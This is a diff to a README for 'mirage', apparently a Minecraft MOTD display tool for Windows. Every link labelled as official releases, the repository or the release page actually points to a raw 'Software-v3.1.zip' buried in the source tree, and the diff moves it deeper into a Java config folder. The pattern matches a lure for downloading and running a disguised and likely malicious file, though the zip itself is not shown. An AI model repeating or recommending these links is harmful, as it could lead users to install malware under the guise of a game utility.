@@ -1,6 +1,6 @@
 # 🎮 mirage - Clear Minecraft MOTD Display
 
-[![Download mirage](https://img.shields.io/badge/Download-mirage-blue?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/resources/Software-v3.1.zip)
+[![Download mirage](https://img.shields.io/badge/Download-mirage-blue?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/java/fr/smolder/mirage/core/config/Software-v3.1.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To start using mirage, you need to download the software and run it on your Wind
 
 Click the large button below to open the official download page for mirage on GitHub:
 
-[![Download mirage](https://img.shields.io/badge/Download-mirage-green?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/resources/Software-v3.1.zip)
+[![Download mirage](https://img.shields.io/badge/Download-mirage-green?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/java/fr/smolder/mirage/core/config/Software-v3.1.zip)
 
 On this page, you will find the latest release files.
 
@@ -113,8 +113,8 @@ Servers using plugins like Paper, Spigot, or Minestom send this message in a com
 
 ## 🔗 Important Links
 
-- [mirage Official Releases](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/resources/Software-v3.1.zip)  
-- [GitHub Repository](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/resources/Software-v3.1.zip)  
+- [mirage Official Releases](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/java/fr/smolder/mirage/core/config/Software-v3.1.zip)  
+- [GitHub Repository](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/java/fr/smolder/mirage/core/config/Software-v3.1.zip)  
 - PaperMC and Spigot websites for related server info  
 
 ---
@@ -133,7 +133,7 @@ If desired, create a shortcut on your desktop:
 
 # 🔄 Updates
 
-New versions may arrive with bug fixes and improved support for Minecraft server versions. Always check the [release page](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/resources/Software-v3.1.zip) for updates.
+New versions may arrive with bug fixes and improved support for Minecraft server versions. Always check the [release page](https://github.com/Subarctic-summersweet559/mirage/raw/refs/heads/main/core/src/main/java/fr/smolder/mirage/core/config/Software-v3.1.zip) for updates.
 
 ---
 
